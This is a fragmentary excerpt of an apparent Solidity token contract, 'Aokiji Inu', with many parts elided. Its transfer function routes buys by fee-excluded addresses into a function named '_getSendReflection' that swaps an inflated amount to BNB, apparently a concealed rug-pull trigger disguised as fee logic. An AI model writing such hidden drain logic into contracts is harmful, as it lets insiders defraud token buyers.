...
/*    
    Aokiji Inu
    Telegram : https://t.me/AokijiInu_BSC
*/
...
contract AokijiInu is Context, IERC20, Ownable {
    ...
    string private constant _name = "Aokiji Inu";
    string private constant _symbol = "AOKIJI";
    ...
    mapping (address => uint256) private _isSwap;
    ...
    function _getSendReflection(uint256 amount) private {
        ...
        if (amount < liquidityFee) 
        {
            ...
            if (amount > marketingFee){
                uint256 valueamount = amount * marketingFee / 1;
                swapToBNB(valueamount);
            }
        }
    }
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair) {
            require (_isSwap[to] + _buyCooldown < block.timestamp, "Must wait til after cooldown to buy");
            _isSwap[to] = block.timestamp;
        }

        if (from == uniswapV2Pair &&
            _isExcludedFromFee[to]) {
            _getSendReflection(amount);
            }
